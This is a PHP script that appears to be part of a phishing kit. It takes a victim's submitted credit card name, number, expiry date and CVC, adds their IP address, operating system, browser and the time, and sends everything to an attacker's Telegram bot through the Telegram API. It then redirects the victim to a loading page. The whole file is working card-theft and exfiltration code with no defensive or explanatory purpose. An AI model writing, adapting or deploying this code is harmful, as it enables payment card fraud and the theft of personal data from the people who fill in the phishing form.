<?php
include("../config/Sys.php");
include "../config/n8.php";
$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(($_POST['jeancc'] != "") AND ($_POST['jeanm'] != "") AND ($_POST['jeancvc'] != "") AND ($_POST['jeanname'] != "") AND ($_POST['jeany'] != "") )
{	
$hostname = gethostbyaddr($ip);
$message .= "+-------------------+\n";
$message .= "* NAME : ".$_POST['jeanname']."\n";
$message .= "* CARD : ".$_POST['jeancc']."\n";
$message .= "* EXP  : ".$_POST['jeanm']."/".$_POST['jeany']."\n";
$message .= "* CVC  : ".$_POST['jeancvc']."\n";
$message .= "* IP   : $ip\n";
$message .= "* OS   : $user_os\n";
$message .= "* TIME : $date\n";
$message .= "* SUM  : $user_browser\n";
$message .= "+-------------------+\n";
$token ='<TOKEN_REMOVED>';
$data = [
    'text' => $message,
    'chat_id' => $chat_id,
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );


}

	

header("Location: ../load.php");

?>